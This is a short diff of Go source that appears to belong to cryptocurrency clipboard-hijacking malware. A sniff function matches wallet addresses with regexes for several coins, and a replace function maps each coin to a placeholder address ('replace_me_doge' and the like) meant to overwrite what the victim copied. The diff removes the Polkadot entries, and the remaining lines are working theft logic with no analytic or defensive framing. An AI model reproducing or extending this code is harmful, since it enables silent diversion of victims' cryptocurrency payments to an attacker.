@@ -35,7 +35,6 @@ func replace(user_clipboard string, crypto_found string) string {
 		"doge": "replace_me_doge",
 		"ada":  "replace_me_ada",
 		"lite": "replace_me_lite",
-		"dot":  "replace_me_dot",
 		"tron": "replace_me_tron",
 	}
 
@@ -57,7 +56,6 @@ func sniff(user_clipboard string) string {
 		"ada":  "^D[A-NP-Za-km-z1-9]{35,}$",
 		"lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
 		"tron": "^T[a-zA-Z0-9]{33}$",
-		"dot":  "^[1-9A-HJ-NP-Za-km-z]*$",
 	}
 
 	for k, v := range crypto_regex_match {
